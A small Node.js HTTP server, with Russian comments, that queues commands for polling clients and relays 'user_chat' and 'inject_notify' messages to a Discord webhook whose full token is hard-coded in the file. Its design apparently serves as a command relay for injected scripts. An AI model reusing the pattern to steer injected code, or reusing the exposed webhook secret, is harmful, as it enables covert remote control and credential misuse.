const http = require('http');
const fetch = require('node-fetch');

let lastCommand = "";
let lastArgs = [];
const WEBHOOK_URL = "https://discord.com/api/webhooks/1397978005007110334/13sdkqWcsZu_YoyBgOpoWgrPfOzHBRL-R8dydXTLYI7KZIc4jSKlpcUX16vrrrC1nQqS";

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method === 'POST' && req.url === '/command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const { command, args } = JSON.parse(body);
            
            // Логирование в Discord
            if (command === "user_chat" || command === "inject_notify") {
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**${args[0]}:** ${args[1]}`
                    })
                });
            }

            lastCommand = command;
            lastArgs = args || [];
            res.end(JSON.stringify({ status: "OK" }));
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/data') {
        res.end(JSON.stringify({
            command: lastCommand,
            args: lastArgs
        }));
        lastCommand = "";
        return;
    }

    res.writeHead(404);
    res.end("Not Found");
});

server.listen(process.env.PORT || 3000, () => {
    console.log("Сервер запущен на порту 3000");
});
